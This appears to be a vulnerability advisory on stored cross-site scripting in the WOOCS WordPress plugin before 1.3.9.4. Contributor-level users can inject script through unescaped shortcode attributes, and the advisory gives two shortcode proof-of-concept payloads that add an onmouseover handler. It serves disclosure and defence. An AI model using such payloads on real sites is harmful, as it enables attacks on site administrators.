## WordPress Plugin Vulnerabilities

# WOOCS < 1.3.9.4 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in the page, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks which could be used against high privilege users such as admins.

### Proof of Concept

[woocs\_show\_current\_currency currency='1" onmouseover="alert(/XSS/)" b=' text='ClickMe!']
[woocs\_rates precision='1" onmouseover="alert(/XSS/)" b=']

### Affects Plugins
